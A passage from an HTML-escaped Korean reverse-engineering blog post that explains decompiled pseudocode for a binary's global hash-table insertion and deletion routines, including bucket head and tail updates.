    LOBYTE(v33) = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
    CAggToESVal((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v15, v16, PropName, PointerType_1);
    PointerType = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31);
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;CAggToESVal&lt;/code&gt; &amp;#xC774;&amp;#xC804;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xBD84;&amp;#xC11D;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;InsertToGlobalHashTable&#34;&gt;&lt;a href=&#34;#InsertToGlobalHashTable&#34; class=&#34;headerlink&#34; title=&#34;InsertToGlobalHashTable&#34;&gt;&lt;/a&gt;InsertToGlobalHashTable&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;_DWORD *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;InsertToGlobalHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Data)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v4[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+4h] [ebp-8h] BYREF&lt;/span&gt;

  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( Data )
  {
    InsertIfNotPresent(&amp;amp;GlobalHashTable, (ListEntry *)v4, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;Data)-&amp;gt;Flink-&amp;gt;field_C = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
    *(_DWORD *)a1 = Data;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (_DWORD *)a1;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xACFC; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;InsertIfNotPresent&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xBA74; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &lt;code&gt;a1&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &lt;code&gt;Data&lt;/code&gt;&amp;#xB97C; &amp;#xC4F0;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;InsertIfNotPresent&#34;&gt;&lt;a href=&#34;#InsertIfNotPresent&#34; class=&#34;headerlink&#34; title=&#34;InsertIfNotPresent&#34;&gt;&lt;/a&gt;InsertIfNotPresent&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;ListEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;InsertIfNotPresent&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, ListEntry *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  ListEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  HashBucketEntry *newBucketEntry; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  HashBucketEntry *BucketHead; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  HashBucketEntry *v8; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; v9; &lt;span class=&#34;hljs-comment&#34;&gt;// zf&lt;/span&gt;
  ListEntry findResult; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+10h] [ebp-24h] BYREF&lt;/span&gt;
  HashBucketEntry v11; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+18h] [ebp-1Ch] BYREF&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v12; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+30h] [ebp-4h]&lt;/span&gt;

  DataHash = hashFunction(&lt;span class=&#34;hljs-number&#34;&gt;0x811C9DC5&lt;/span&gt;, pData, &lt;span class=&#34;hljs-number&#34;&gt;4u&lt;/span&gt;);
  FindDataFromHashTable(hashTable, &amp;amp;findResult, pData, DataHash);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( findResult.Blink )                       &lt;span class=&#34;hljs-comment&#34;&gt;// Data is present in HashTable, no insertion&lt;/span&gt;
  {
    result = a2;
    a2-&amp;gt;Flink = findResult.Blink;
    LOBYTE(a2-&amp;gt;Blink) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;                                          &lt;span class=&#34;hljs-comment&#34;&gt;// Data is not present -&amp;gt; insertion occurs&lt;/span&gt;
  {
    hashTableLengthCheck(hashTable);
    v11.Data = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)pData;
    AllocateNewNode(&amp;amp;v11, (HashBucketEntry *)&amp;amp;hashTable-&amp;gt;DefaultHead, &amp;amp;dword_2100AE5C, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v11.Data);&lt;span class=&#34;hljs-comment&#34;&gt;// allocate new node&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// v11.list_entry.list_entry.blink = new_node&lt;/span&gt;
    v12 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( IsBucketExpandNeeded(hashTable) )
    {
      expandHashTable(hashTable);
      newBucketEntry = v11.list_entry.list_entry.Blink;
      BucketHead = FindDataFromHashTable(hashTable, &amp;amp;findResult, &amp;amp;v11.list_entry.list_entry.Blink-&amp;gt;Data, DataHash)-&amp;gt;Flink;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      BucketHead = findResult.Flink;
      newBucketEntry = v11.list_entry.list_entry.Blink;
    }
    v11.list_entry.list_entry.Blink = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    v8 = InsertIntoHashTable(hashTable, DataHash, BucketHead, newBucketEntry);
    v9 = v11.list_entry.list_entry.Blink == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    a2-&amp;gt;Flink = v8;
    LOBYTE(a2-&amp;gt;Blink) = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v9 )
      sub_20867B89(v11.list_entry.list_entry.Blink);
    result = a2;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FindDataFromHashTable&lt;/code&gt;&amp;#xB85C; &amp;#xBA3C;&amp;#xC800; &amp;#xC0BD;&amp;#xC785;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xBBF8; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;findResult.Blink&lt;/code&gt;&amp;#xAC00; &lt;code&gt;NULL&lt;/code&gt;&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xAE30;&amp;#xC5D0; &lt;code&gt;if&lt;/code&gt;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xC5EC; &amp;#xC0BD;&amp;#xC785; &amp;#xACFC;&amp;#xC815; &amp;#xC5C6;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xACE0; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC0BD;&amp;#xC785;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xC5EC; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC0BD;&amp;#xC785;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;else&lt;/code&gt; &amp;#xBD84;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;AllocateNewNode&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;Data&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;*pData&lt;/code&gt;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; &amp;#xB178;&amp;#xB4DC;&amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xACE0; &lt;code&gt;findResult.Flink&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB420; &amp;#xBC84;&amp;#xD0B7;&amp;#xC758; &lt;code&gt;Head&lt;/code&gt;&amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xB178;&amp;#xB4DC;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;InsertIntoHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;InsertIntoHashTable&#34;&gt;&lt;a href=&#34;#InsertIntoHashTable&#34; class=&#34;headerlink&#34; title=&#34;InsertIntoHashTable&#34;&gt;&lt;/a&gt;InsertIntoHashTable&lt;/h3&gt;&lt;p&gt;&lt;code&gt;InsertIntoHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;target-&amp;gt;Blink&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;newNode&lt;/code&gt;&amp;#xB97C; &amp;#xC0BD;&amp;#xC785;&amp;#xD558;&amp;#xB294; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;HashBucketEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;InsertIntoHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash, HashBucketEntry *target, HashBucketEntry *newNode)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  HashBucketEntry *tmp; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  HashBucketEntryHeader *v6; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  HashBucketEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  tmp = target-&amp;gt;list_entry.list_entry.Blink;
  ++hashTable-&amp;gt;length;                          &lt;span class=&#34;hljs-comment&#34;&gt;// Increase Length&lt;/span&gt;
  newNode-&amp;gt;list_entry.list_entry.Flink = target;
  newNode-&amp;gt;list_entry.list_entry.Blink = tmp;
  tmp-&amp;gt;list_entry.list_entry.Flink = newNode;
  target-&amp;gt;list_entry.list_entry.Blink = newNode;&lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// Blink: &amp;lt;-&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// Flink: -&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// Before Insertion&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// ... &amp;lt;-&amp;gt; tmp &amp;lt;-&amp;gt; target &amp;lt;-&amp;gt; ...&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// After Insertion&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//  &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//  ... &amp;lt;-&amp;gt; tmp &amp;lt;-&amp;gt; newNode &amp;lt;-&amp;gt; target &amp;lt;-&amp;gt; ...&lt;/span&gt;
  idx = DataHash &amp;amp; hashTable-&amp;gt;HashBuckets.BucketMaxIndex;
  v6 = hashTable-&amp;gt;HashBuckets.HashBucketBegin;
  result = newNode;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v6[idx].BucketHead == hashTable-&amp;gt;DefaultHead )
  {
    v6[idx].BucketHead = newNode;
LABEL_6:
    v6[idx].BucketTail = newNode;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v6[idx].BucketHead == target )
  {
    v6[idx].BucketHead = newNode;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v6[idx].BucketTail == tmp )
    &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_6;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xC0BD;&amp;#xC785;&amp;#xC73C;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &amp;#xBC84;&amp;#xD0B7;&amp;#xC758;  Head&amp;#xB098; Tail&amp;#xC774; &amp;#xBC14;&amp;#xB010; &amp;#xACBD;&amp;#xC6B0;, &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &lt;code&gt;HashBucketEntryHeader&lt;/code&gt;&amp;#xC758; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xB098; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC744; &amp;#xBCC0;&amp;#xACBD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC758; &amp;#xC0BD;&amp;#xC785;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;DeleteGlobalFromHashTable&#34;&gt;&lt;a href=&#34;#DeleteGlobalFromHashTable&#34; class=&#34;headerlink&#34; title=&#34;DeleteGlobalFromHashTable&#34;&gt;&lt;/a&gt;DeleteGlobalFromHashTable&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-title&#34;&gt;DeleteFromGlobalHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(_DWORD *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *pData )                                 
  {
    result = DeleteFromHashTable(&amp;amp;GlobalHashTable, pData);
    *pData = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xACFC; &lt;code&gt;pData&lt;/code&gt;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;DeleteFromHashTable&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;DeleteFromHashTable&#34;&gt;&lt;a href=&#34;#DeleteFromHashTable&#34; class=&#34;headerlink&#34; title=&#34;DeleteFromHashTable&#34;&gt;&lt;/a&gt;DeleteFromHashTable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-title&#34;&gt;DeleteFromHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, _DWORD *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  HashBucketEntry *v4; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  ListEntry result; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+Ch] [ebp-8h] BYREF&lt;/span&gt;

  DataHash = hashFunction(&lt;span class=&#34;hljs-number&#34;&gt;0x811C9DC5&lt;/span&gt;, pData, &lt;span class=&#34;hljs-number&#34;&gt;4u&lt;/span&gt;);
  v4 = FindDataFromHashTable(hashTable, &amp;amp;result, pData, DataHash)-&amp;gt;Blink;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v4 )
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;                                   &lt;span class=&#34;hljs-comment&#34;&gt;// Not Found, No deletion&lt;/span&gt;
  UnlinkTargetFromBucketEntryHeader(hashTable, v4, DataHash &amp;amp; hashTable-&amp;gt;HashBuckets.BucketMaxIndex);
  UnlinkSelf((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;hashTable-&amp;gt;DefaultHead, v4);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;DeleteFromHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FindDataFromHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0;&amp;#xC11C; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0;&amp;#xC790; &amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;&amp;#xBA74; &amp;#xB2E4;&amp;#xB978; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC81C;&amp;#xAC70;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; &amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;UnlinkTargetFromBucketEntryHeader&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;UnlinkTargetFromBucketEntryHeader&#34;&gt;&lt;a href=&#34;#UnlinkTargetFromBucketEntryHeader&#34; class=&#34;headerlink&#34; title=&#34;UnlinkTargetFromBucketEntryHeader&#34;&gt;&lt;/a&gt;UnlinkTargetFromBucketEntryHeader&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;HashBucketEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;UnlinkTargetFromBucketEntryHeader&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, HashBucketEntry *target, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Idx)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  HashBucketEntryHeader *v3; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  HashBucketEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  v3 = hashTable-&amp;gt;HashBuckets.HashBucketBegin;
  result = target;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v3[Idx].BucketTail == target )           
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v3[Idx].BucketHead == target )        
    {
      result = hashTable-&amp;gt;DefaultHead;
      v3[Idx].BucketHead = result;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      result = target-&amp;gt;list_entry.list_entry.Blink;
    }
    v3[Idx].BucketTail = result;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v3[Idx].BucketHead == target )
  {
    result = target-&amp;gt;list_entry.list_entry.Flink;
    v3[Idx].BucketHead = target-&amp;gt;list_entry.list_entry.Flink;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xAC00; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0;&amp;#xC790; &amp;#xD558;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC778; &lt;code&gt;target&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xC740;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xC5EC; Head&amp;#xB098; Tail &amp;#xD639;&amp;#xC740; &amp;#xC591;&amp;#xCABD; &amp;#xBAA8;&amp;#xB450;&amp;#xB97C; &amp;#xAC31;&amp;#xC2E0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;target&lt;/code&gt;&amp;#xC774; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;target-&amp;gt;Flink&lt;/code&gt;&amp;#xB97C; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; Head&amp;#xB85C; &amp;#xAC31;&amp;#xC2E0;&amp;#xD558;&amp;#xACE0; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;target-&amp;gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; Tail&amp;#xB85C; &amp;#xAC31;&amp;#xC2E0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;target&lt;/code&gt;&amp;#xC774; &amp;#xBC84;&amp;#xD0B7;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC720;&amp;#xC77C;&amp;#xD55C; &amp;#xB178;&amp;#xB4DC;&amp;#xB77C;&amp;#xBA74; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; 